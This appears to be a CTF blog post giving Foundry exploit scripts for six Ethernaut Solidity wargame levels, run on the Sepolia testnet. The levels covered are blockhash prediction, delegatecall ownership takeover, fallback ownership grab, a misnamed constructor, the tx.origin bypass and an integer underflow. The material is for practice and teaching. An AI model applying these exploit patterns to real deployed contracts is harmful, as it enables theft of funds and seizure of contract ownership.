---
title: 'Ethernaut Challenges'
cover: https://miro.medium.com/1*aduuY7__I7sgHfTaTjzZ2g.png
categories: ["ctf"]
tags: ["blockchain"]
date: 2025-09-11T12:00:00-04:00
lastmod: 2025-09-11T12:00:00-04:00
---


# Solving ethernaut challenges!

## CoinFlip

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/CoinFlip.sol";

contract Exploit {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlipInstance;

    constructor(CoinFlip _coinFlipInstance) {
        coinFlipInstance = _coinFlipInstance;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinFlipInstance = CoinFlip(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Exploit exploit = new Exploit(coinFlipInstance);
        exploit.attack();

        console.log("Number of wins:", coinFlipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
```

Running the script to solve the challenge:

```bash
forge script script/CoinFlipSolution.s.sol --rpc-url $SEPOLIA_URL --tc CoinFlipSolution --broadcast
```

## Delegation

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Delegation.sol";

contract TokenSolution is Script {
    Delegation public delegationInstance = Delegation(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner of the contract is currently: ", delegationInstance.owner());
        console.log("My current address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
```

Running the script to solve the challenge:

```bash
forge script script/DelegationSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

## Fallback

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(<YOUR_INSTANCE>));

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackInstance.contribute{value: 1 wei}();
        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Fallback call failed");
        console.log("New Owner", fallbackInstance.owner());
        console.log("My Address", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }
}
```

Running the script to solve the challenge:

```bash
forge script script/FallbackSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

## Fallout

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallout.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before attack: ",falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("Owner after attack: ",falloutInstance.owner());
        console.log("\nCOMPARE WITH:\n");
        console.log("My Address", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
```

Running the script to solve the challenge:

```bash
forge script script/FalloutSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

## Telephone

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Telephone.sol";

contract Attack {
  Telephone public telephoneInstance;
  address evilOwner;


  constructor(Telephone _telephoneInstance, address _evilOwner) {
    telephoneInstance = _telephoneInstance;
    evilOwner = _evilOwner;
  }

  function exploit() public {
    telephoneInstance.changeOwner(evilOwner);
  }
}

contract TelephoneSolution is Script {
    Telephone public telephoneInstance = Telephone(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attacker = new Attack(telephoneInstance,vm.envAddress("MY_ADDRESS"));
        attacker.exploit();

        console.log("The owner of the contract is:",telephoneInstance.owner());
        console.log("\nCOMPARE WITH:\n");
        console.log("My address is:", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}
```

Running the script to solve the challenge:

```bash
forge script script/TelephoneSolution.s.sol --rpc-url $SEPOLIA_URL --tc TelephoneSolution --broadcast
```

## Token

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Token.sol";

contract TokenSolution is Script {
    Token public tokenInstance = Token(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 21);
        uint256 balance = tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("Attacker balance: ", balance);
        vm.stopBroadcast();
    }
}
```


Running the script to solve the challenge:

```bash
forge script script/TokenSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```